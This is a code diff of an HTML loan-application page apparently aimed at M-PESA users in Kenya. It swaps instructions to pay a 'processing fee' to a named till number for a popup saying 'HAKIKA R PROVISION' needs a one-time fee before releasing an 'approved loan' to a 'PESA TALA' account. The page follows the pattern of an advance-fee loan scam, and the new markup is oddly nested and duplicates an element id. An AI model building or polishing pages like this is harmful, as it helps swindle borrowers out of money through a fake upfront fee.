@@ -38,18 +38,14 @@
       <p class="text-sm mb-2">Processing Fee: <span class="font-bold text-purple-700" id="popupFee">Ksh ...</span></p>
       <p class="text-sm mb-4">Repayment Period: <strong>14 Days</strong></p>
 
-      <div class="text-left text-sm mb-4 bg-gray-100 p-3 rounded-xl shadow-sm">
-        <p class="font-semibold mb-2">To complete your application:</p>
-        <ul class="list-disc list-inside text-gray-700 space-y-1">
-          <li>Go to M-PESA: <strong>M-PESA</strong></li>
-          <li>Lipa na M-PESA: <strong>Buy Goods and Services</strong></li>
-          <li>Enter Till Number: <strong id="till">9824375</strong> 
-            <button onclick="copyTill()" class="text-xs text-blue-500 underline ml-1">Click to copy</button>
-          </li>
-          <li>Enter Amount: <strong id="popupFee2">Ksh ...</strong></li>
-          <li>Enter your M-PESA PIN and complete the payment</li>
-        </ul>
-      </div>
+      <div id="popupOverlay" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
+    <div class="bg-white text-purple-900 rounded-2xl p-6 w-11/12 max-w-sm text-center shadow-xl">
+      <h2 class="text-xl font-bold mb-2">Hi, <span id="userName">User</span></h2>
+      <p class="text-sm mb-4">
+        To proceed, <strong>HAKIKA R PROVISION</strong> requires you to make a one-time processing fee payment of
+        <span class="font-bold text-purple-700" id="popupFee">Ksh ...</span> for your approved loan of
+        <span class="font-bold text-purple-700" id="popupLoan">Ksh ...</span> to your <strong>PESA TALA</strong> account below.
+      </p>
 
       <button onclick="goToVerification()" class="bg-purple-700 hover:bg-purple-800 text-white py-2 px-6 rounded-xl shadow-md transition">
         Proceed to Payment
